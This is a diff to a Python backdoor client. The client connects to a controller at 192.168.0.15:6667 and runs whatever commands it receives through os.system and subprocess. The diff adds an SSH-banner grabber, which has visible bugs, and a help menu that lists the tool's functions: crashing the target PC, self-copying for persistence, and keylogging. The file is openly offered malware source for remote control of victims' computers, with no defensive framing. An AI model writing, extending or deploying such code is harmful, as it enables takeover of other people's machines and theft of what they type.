@@ -49,6 +49,13 @@ def clone():
         conn.send(msg.encode("utf-8"))
         pass
 
+def get_banner():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect("localhost",22)
+    banner = sock.recv(2048)
+    sock.close()
+    conn.send(banner.encode("utf-8"))
+
 def bat_create(file_path=""):
     if(file_path == ""):
         file_path = temp_path
@@ -63,6 +70,8 @@ conn.connect(("192.168.0.15",6667))
 
 while True:
     cmd = conn.recv(1024).decode('utf-8')
+    if cmd == "help":
+        print("help menu\n commands: \n exit: break the connection with the target\n kill: open infinity tabs with a rick roll meme and crash the pc (not forever) \n stay: make a copy of this backdoor for a paste in tmp arquives (read the docs(in progress) \n banner: get somme infos about the device \n Kstay: a mix of the function stay and kill \n keylog(in progress): registy any keys typed in the keyboard \n help: open this menu")
     if cmd == "exit":
         break
     if cmd == "kill":
@@ -76,6 +85,8 @@ while True:
         bat_create()
         clone()
         #re-start the server
+    if cmd == "banner":
+        get_banner()
     if cmd == "Kstay":
         bat_create()
         clone()
@@ -85,8 +96,6 @@ while True:
     if cmd == "keylog":
         with Listener(on_press = functionPK) as the_listener:  
             the_listener.join()
-
-# --------------------------------------------------------------------------------------------------------------------------------------
 
     os.system(cmd)
     output = subprocess.getoutput(cmd)
